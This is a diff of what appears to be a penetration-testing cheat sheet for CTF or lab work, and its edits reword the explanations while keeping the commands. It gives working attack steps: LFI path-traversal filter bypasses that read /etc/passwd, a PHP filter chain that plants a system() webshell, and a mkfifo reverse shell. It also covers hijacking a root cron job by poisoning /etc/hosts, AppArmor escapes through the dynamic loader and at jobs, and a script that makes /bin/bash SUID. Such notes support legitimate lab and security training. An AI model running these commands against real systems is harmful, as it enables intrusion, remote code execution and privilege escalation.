@@ -163,23 +163,24 @@ curl 'http://<target>/page.php?file=../../../../var/log/apache2/access.log&cmd=i
 
 ### LFI Filter Bypass — `../..` Blocked
 
-When a filter blocks the exact substring `../..` but the app still needs a path prefix:
+If the filter blocks `../..` as a string, swap each `../` for `.././` — it still moves up directories but the blocked pattern never appears.
 
 ```bash
-# Replace every ../ with .././ — avoids the ../.. substring while still traversing up
-# Example: reading /etc/passwd when filter blocks ../.. and requires /var/www/html/app
+# .././ chaining — reads /etc/passwd when filter blocks ../.. and requires /var/www/html/app
 curl 'http://<target>/page.php?file=/var/www/html/app/.././.././.././../etc/passwd'
 
 # Alternative: pad with ./ between each ..
 curl 'http://<target>/page.php?file=/var/www/html/app/./../././../././../././etc/passwd'
 ```
 
-Always use `php://filter/convert.base64-encode` first to read the PHP source and understand the exact filter rules before guessing traversal strings.
+Read the PHP source first with `php://filter/base64` — it shows you the exact filter rules so you're not guessing.
 
 ### Vhost Discovery from Page Source
 
+Email addresses in a page's source often reveal hidden virtual hostnames. Grep for them, then add what you find to `/etc/hosts`.
+
 ```bash
-# Grep page source for email addresses — domain part often reveals hidden vhosts
+# Pull email/domain strings from the homepage
 curl -s http://<target>/ | grep -iE 'href|mail|@' | grep -oP '[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}'
 
 # Add discovered vhost to /etc/hosts
@@ -190,13 +191,13 @@ echo "<IP>  <vhost>" | sudo tee -a /etc/hosts
 
 **Tool:** https://github.com/synacktiv/php_filter_chain_generator
 
-Generates arbitrary PHP code from iconv encoding artifacts — no log, no upload, no writable file needed. Requires only a working LFI `include`.
+This turns a plain LFI into code execution with no file upload and no log poisoning. It chains PHP encoding filters in a way that produces PHP code as a side effect. All you need is a working `include`.
 
 ```bash
-# Generate chain
+# Generate the chain
 CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)
 
-# Execute command (--output - required to handle binary garbage in chain output)
+# Run a command (--output - stops curl from choking on the binary junk in the chain)
 curl "http://<target>/vuln.php?file=${CHAIN}&cmd=id" --output -
 
 # Reverse shell
@@ -205,10 +206,10 @@ curl "http://<target>/vuln.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ft
 
 **Path check bypass — `php://temp?<path>` trick**
 
-When the LFI filter requires a specific string in the `view` parameter (e.g. `strpos($view, '/var/www/html/app')`), the chain's `resource=php://temp` will be rejected because it doesn't contain the required path. Fix: append the required path as a query string on the temp stream. PHP ignores query strings on `php://` wrappers, so the chain still gets its empty input — but `strpos()` sees the required string and passes.
+Some filters check that your path contains a specific folder name. The chain uses `resource=php://temp` by default, which won't pass that check. Add the required folder as a query string after `php://temp` — PHP ignores it when opening the stream, but the filter sees it and lets the request through.
 
 ```bash
-# Bypass: append required path as query string on php://temp
+# Append the required path as a query string on php://temp
 CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' 2>/dev/null \
   | tail -1 \
   | sed 's|resource=php://temp|resource=php://temp?/var/www/html/app|')
@@ -569,7 +570,7 @@ find / -type f -user <username> 2>/dev/null | xargs ls -lah
 
 ### pspy — Unprivileged Process Monitoring
 
-Catches root-owned cron jobs and short-lived processes that don't appear in `/etc/crontab`. Run this when static cron enumeration comes up empty — let it sit for at least 2-3 minutes.
+Watches all running processes without needing root. Use it when `/etc/crontab` shows nothing useful — it catches cron jobs that run for a split second and exit. Let it run for 2-3 minutes.
 
 ```bash
 # Transfer to target
@@ -578,14 +579,14 @@ chmod +x /tmp/pspy64
 ./pspy64
 ```
 
-Key things to look for:
+Look for lines with `UID=0` — those are root-owned processes:
 
 ```
-CMD: UID=0  PID=xxxx  | /bin/sh -c <command>        ← root-owned process
-CMD: UID=0  PID=xxxx  | curl <hostname>/<script> | bash   ← HTTP fetch + exec = hijack candidate
+CMD: UID=0  PID=xxxx  | /bin/sh -c <command>             ← root is running this
+CMD: UID=0  PID=xxxx  | curl <hostname>/<script> | bash  ← root fetches and runs a script
 ```
 
-`UID=0` is the signal. Once spotted, ask: can I influence any part of that command — the script path, the hostname it fetches from, the working directory?
+When you spot one, ask: can you change the script it runs, the hostname it fetches from, or the folder it runs in?
 
 ### Post-Foothold Credential Hunting
 
@@ -610,7 +611,7 @@ echo '<token>' | base64 -d
 
 ### /etc/hosts Poisoning — Cron HTTP Hijack
 
-When a root cron job fetches a script over HTTP using a **hostname** (not an IP or localhost), and `/etc/hosts` is writable:
+If a root cron job downloads and runs a script using a hostname (not an IP), and you can write to `/etc/hosts`, you can point that hostname at your machine and serve your own payload:
 
 ```bash
 # 1. Confirm /etc/hosts is writable
@@ -635,15 +636,15 @@ bash -p
 
 ### SUID Binary Analysis — strace
 
+Use this on unknown SUID binaries with no man page. It shows every file and program the binary opens when it runs — one of those might be writable by you.
+
 ```bash
-# Trace what a SUID binary actually executes (scripts, files, syscalls)
+# Show everything the binary opens or executes
 strace /path/to/suid_binary 2>&1 | grep -iE 'exec|open|read'
 
 # Focus on file opens and exec calls
 strace /path/to/suid_binary 2>&1 | grep -E 'execve|openat|stat'
 ```
-
-Useful when a non-standard SUID binary has no manpage — strace reveals the script or config it loads, which may be world-writable.
 
 ### SUID Binary Abuse
 
@@ -669,35 +670,37 @@ su - hacker
 
 ### AppArmor Bypass
 
+AppArmor restricts what programs can do on the system. These two methods run code outside those restrictions.
+
 ```bash
 # Check if AppArmor is active
 aa-status 2>/dev/null
 ```
 
-**Method 1 — ELF dynamic loader (immediate, no scheduling required)**
+**Method 1 — ELF dynamic loader**
 
-Invoke the system's dynamic linker directly to spawn a shell outside AppArmor confinement. The loader itself is unconfined, so the bash process it starts inherits no AppArmor profile:
+Call the dynamic linker (the program that loads other programs) directly. It runs without AppArmor restrictions, so the shell it opens is also unrestricted:
 
 ```bash
 /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
 ```
 
-From the unconfined shell you can write directly to paths that were previously blocked, then trigger the SUID binary normally.
+From that shell you can write to paths that were blocked before, then run the SUID binary as normal.
 
-**Method 2 — `at` job scheduling (when editors and direct writes are blocked)**
+**Method 2 — `at` job scheduling**
 
-`at` jobs run through `/bin/sh` in a process context outside the confined shell's AppArmor profile. Also useful when `vi` and text editors are restricted — build the script with `echo >>` instead:
+`at` schedules a command to run later. Those jobs start in a fresh process that AppArmor doesn't restrict. Also useful when text editors are blocked — build your script with `echo >>` line by line instead:
 
 ```bash
-# Build injection script line by line (vi blocked under AppArmor)
+# Build the script without a text editor
 echo '#!/bin/bash' >> /var/tmp/inject.sh
 echo 'echo "chmod +s /bin/bash" > /opt/target_script.sh' >> /var/tmp/inject.sh
 chmod +x /var/tmp/inject.sh
 
-# Schedule via at — runs outside confined context
+# Run it via at — outside AppArmor
 at now -f /var/tmp/inject.sh
 
-# Verify
+# Check it worked
 tail -1 /opt/target_script.sh
 ```
 
